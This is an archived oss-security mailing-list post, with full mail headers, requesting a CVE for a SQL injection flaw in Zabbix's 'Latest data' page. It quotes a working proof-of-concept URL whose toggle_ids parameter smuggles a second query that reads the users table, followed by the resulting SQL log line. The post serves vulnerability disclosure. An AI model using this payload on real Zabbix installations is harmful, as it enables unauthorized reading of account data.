X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["846" "Thursday" "12" "January" "2017" "06:42:38" "+0100" "Salvatore Bonaccorso" "carnil@debian.org" "<20170112054238.GA8011@lorien.valinor.li>" "23" "[oss-security] CVE Request: Zabbix: SQL injection vulnerabilities in \"Latest data\"" "^Date:" nil nil "1" "2017011205:42:38" "[oss-security] CVE Request: Zabbix: SQL injection vulnerabilities in \"Latest data\"" (number mark "        carnil@debia Jan 12   23/846   " thread-indent "\"[oss-security] CVE Request: Zabbix: SQL injection vulnerabilities in \"Latest data\"\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 9951 invoked by uid 550); 12 Jan 2017 05:42:55 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 9921 invoked from network); 12 Jan 2017 05:42:54 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=sender:date:from:to:subject:message-id:mime-version
         :content-disposition:content-transfer-encoding:user-agent;
        bh=w8vCsNFuQZImK5ec3U3TA9ZMR7Y4KWxDX9UIp3gakjY=;
        b=l9bfixPAZSeTD4N1T0FGAQVahroEc0Exl9vpbE9rM41FyyEh858+u4LVuD4SZqVu9m
         mlHAPynO3q1RuaCcCZBxSh5594vU6fCDHlvf/lbYMOcxFN7SD3XIlsUBlOG46vBa2Kw/
         Al0nt7QbxG7MOphwYLOlCe+d17+5TBh3Vc1VYo/ZIb3p6YjN5MmG1SC/jmKsMZGB3Eev
         k4bBbuMaEFPwZjosoJfcGpXBeyxT+Nb30qwmHn0pLOSqrXKz0qSgyq/6L4PBw0PRRcGe
         Ea8SElxcqc1JrGClDOUqU6E6MIccR+PeJ6cVly9ukyjHVvofibCRqn3CnFXZQOiwj0Li
         MvIA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:sender:date:from:to:subject:message-id
         :mime-version:content-disposition:content-transfer-encoding
         :user-agent;
        bh=w8vCsNFuQZImK5ec3U3TA9ZMR7Y4KWxDX9UIp3gakjY=;
        b=sSOxq6KqZzhvVIx2lVOPu1TW8j767jcpqdTzzSjcRJMUq3FC8ux5TSreYl4AkDDcUA
         SyDVfQWdvtm02r3WdLrqQlFRcHPNPu2nni4OHl1ygd741LJoEk9CHVKXOTfc2nt2xuQH
         PQyI5cWSxLn9Of61Em65iaYy9uOMo2bzUYrDjOIWkf/vJpS4UWcKCbE/uOIYbMgO4jCC
         HEUlu5v2yylvAvZ1sPvvbYLdDewZrZZELYLfjVg7AAJnexaENqf/+EfxNickA6jTgHY3
         J3A7w0aP7bKetUFoq/dYfQrsKvI9VnV2Hwbd/glndh5sU3QSiPnhYrgkzHrqiuxLhtPI
         MSZA==
X-Gm-Message-State: AIkVDXJYddf8Ajxjq53+sEa06M/ah0X9b4NU2Np0W1o+x69/oP6lgQzRkDaN6VU5FHAiUg==
X-Received: by 10.36.238.133 with SMTP id b127mr8597531iti.20.1484199762908;
        Wed, 11 Jan 2017 21:42:42 -0800 (PST)
Message-ID: <20170112054238.GA8011@lorien.valinor.li>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
User-Agent: Mutt/1.5.23 (2014-03-12)
Date: Thu, 12 Jan 2017 06:42:38 +0100
From: Salvatore Bonaccorso <carnil@debian.org>
Reply-To: oss-security@lists.openwall.com
Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
Subject: [oss-security] CVE Request: Zabbix: SQL injection vulnerabilities in "Latest data"
To: OSS Security Mailinglist <oss-security@lists.openwall.com>

Hi

>From [1].
> Zabbix 2.2.x, 3.0.x and trunk suffers from a remote SQL injection
> vulnerability due to a failure to sanitize input in the toggle_ids
> array in the latest.php page.
> 
> For example:
> latest.php?output=ajax&sid=&favobj=toggle&toggle_open_state=1&toggle_ids[]=15385); select * from users where (1=1
> 
> Result
> 
> SQL (0.000361): INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (88, 1, 'web.latest.toggle', '1', 2, 15385); select * from users where (1=1)
> latest.php:746 → require_once() → CProfile::flush() → CProfile::insertDB() → DBexecute() in /home/sasha/zabbix-svn/branches/2.2/frontends/php/include/profiles.inc.php:185


 [1] https://support.zabbix.com/browse/ZBX-11023
 [2] https://bugs.debian.org/850936

Could you please assign a CVE for this zabbix issue.

Regards,
Salvatore
